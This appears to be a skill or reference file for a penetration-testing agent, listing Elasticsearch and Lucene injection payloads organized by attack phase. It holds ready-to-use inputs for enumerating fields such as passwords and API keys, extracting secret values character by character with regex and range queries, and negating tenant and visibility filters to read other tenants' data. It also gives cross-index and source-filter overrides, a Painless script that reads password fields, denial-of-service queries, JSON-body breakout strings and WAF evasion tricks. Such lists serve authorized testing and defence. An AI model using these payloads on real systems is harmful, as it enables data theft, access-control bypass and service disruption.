---
description: Lucene query_string injection, field enumeration (`_exists_`, wildcard fields), regex and range extraction, filter negation, cross-index access, source filtering override, direct API enumeration, JSON-body breakout
skill: elasticsearch-injection
---

# Elasticsearch / Lucene Injection Payloads

Organized by attack phase: detection → field enumeration → data extraction → exploitation.

## Detection Payloads

### Confirm query_string Processing

```
# Boolean logic — if processed, AND/OR/NOT change the result set.
# `1=1` is not Lucene logic (the standard analyzer turns it into terms); use match-all instead.
test AND *:*
test AND NOT *:*
test OR impossible_term_xyz

# Wildcard — returns more results than specific term
*
te?t
test*

# Field-qualified — if syntax works, field:value notation is processed
title:test
_all:*
nonexistent_field:anything

# Grouping and precedence
(test) AND (something)
(test) OR (*:*)
```

### Confirm simple_query_string

```
# Prefix/suffix operators
+test -impossible
"exact phrase"
test | alternative
test + required
```

### Error-Triggering Payloads (for fingerprinting)

```
# Unbalanced syntax triggers parse errors that leak ES version/query type
test AND
test OR OR
field:[
"unclosed quote
/invalid[regex
{broken json}
```

---

## Field Enumeration Payloads

### Field Existence Probes

```
# _exists_ query (returns docs where field is non-null)
_exists_:password
_exists_:api_key
_exists_:secret
_exists_:ssn
_exists_:credit_card
_exists_:internal_notes
_exists_:admin
_exists_:role
_exists_:permissions

# Negated existence (find docs WITHOUT a field — may reveal schema)
NOT _exists_:verified
NOT _exists_:approved
```

### Wildcard Field Discovery

```
# Partial field name matching (ES query_string supports)
pass*:*
*key*:*
*secret*:*
*token*:*
*auth*:*
*admin*:*
*internal*:*
*private*:*
*hash*:*
*cred*:*
```

---

## Data Extraction Payloads

### Regex-Based Character Extraction

```
# First character probe (binary search)
fieldname:/^[a-m].*/
fieldname:/^[n-z].*/
fieldname:/^[a-g].*/
fieldname:/^[h-m].*/

# Multi-character extraction (build progressively)
fieldname:/^se.*/
fieldname:/^sec.*/
fieldname:/^secr.*/
fieldname:/^secre.*/
fieldname:/^secret.*/
```

### Range-Based Extraction

```
# Numeric ranges
salary:[0 TO 50000]
salary:[50001 TO 100000]
salary:[100001 TO *]

# Date ranges
created_at:[2024-01-01 TO 2024-06-30]
last_login:[2024-01-01 TO *]

# String ranges (lexicographic)
email:[a TO m]
email:[n TO z]
username:[admin TO admin~]
```

---

## Access Control Bypass Payloads

### Negating Application-Injected Filters

```
# If app adds "AND deleted:false" to queries
*) NOT deleted:false OR (*:*
* OR deleted:true

# If app adds "AND tenant_id:CURRENT" 
*) OR tenant_id:OTHER_TENANT OR (*:*
* NOT tenant_id:CURRENT

# If app adds "AND visibility:public"
*) OR visibility:private OR (*:*
* OR visibility:internal

# If app adds "AND status:active"
* OR status:deleted
* OR status:suspended
* OR status:archived
```

### Cross-Index Payloads

```
# If index is specified as a parameter
index=_all
index=*
index=users,credentials,audit_log
index=.kibana

# Index pattern wildcards
index=user*
index=*-2024*
index=.internal*
```

### Source Filtering Override

```
# As query parameters
_source=password,api_key,secret,token
_source_includes=*
_source_excludes=

# Stored fields override
stored_fields=*
stored_fields=password,_source

# Fields parameter (deprecated but may work on old versions)
fields=password,token,secret
```

---

## Direct API Payloads (if ES is exposed)

### Enumeration

```bash
# Cluster info
GET /_cluster/health
GET /_cluster/stats
GET /_nodes

# Index listing
GET /_cat/indices?v
GET /_aliases
GET /*/_mapping

# Document search
GET /_search?size=100
POST /_search {"query":{"match_all":{}},"_source":["*"]}
```

### Aggregation Extraction

```json
{"size": 0, "aggs": {"emails": {"terms": {"field": "email.keyword", "size": 10000}}}}
{"size": 0, "aggs": {"roles": {"terms": {"field": "role.keyword", "size": 100}}}}
```

### Scripts

Painless inline scripts are enabled by default but sandboxed: no `Runtime`, no file or process
access. Groovy and other dynamic languages were disabled and later removed, so OS execution via
scripts applies only to very old clusters. Painless is still useful to read field values the
query cannot return:

```json
{"script_fields": {"leak": {"script": {"source": "doc['password.keyword'].value"}}}}
```

---

## DoS Payloads (use sparingly, with authorization)

```
# Expensive regex. Lucene regex is automaton-based, so there is no catastrophic backtracking;
# oversized automata fail with a max_determinized_states error instead (itself a fingerprint).
fieldname:/.*a{1000}.*/

# Wildcard prefix (forces index scan)
fieldname:*test
fieldname:???????????????test

# Deep nested boolean (query explosion)
(((((((((((((test)))))))))))))
a OR b OR c OR d OR e OR f OR g OR h OR i OR j OR k OR l OR m OR n OR o OR p
```

---

## JSON Body Breakout

When input is interpolated into a JSON query body rather than a query-string parameter:

```
# App builds {"query": {"query_string": {"query": "USER_INPUT"}}}
*", "fields": ["password"], "_source": ["password", "email"]},"dummy": {"match_all": {"query": "

# App builds {"query": {"bool": {"must": [{"match": {"title": "USER_INPUT"}}]}}}
test"}},{"match_all":{}}],"should":[{"match":{"password":"
```

Input reaching an aggregation leaks whole value sets (`terms` on `password.keyword`, above).

## Detection Bypass / WAF Evasion

```
# Unicode variants
\u002A (for *)
\u003A (for :)

# Field name obfuscation
fiel\d:value (backslash in field name — ES may strip it)

# Nested query via JSON body (bypass URL-param WAF rules)
# If the search endpoint accepts POST with JSON body, move injection there
```
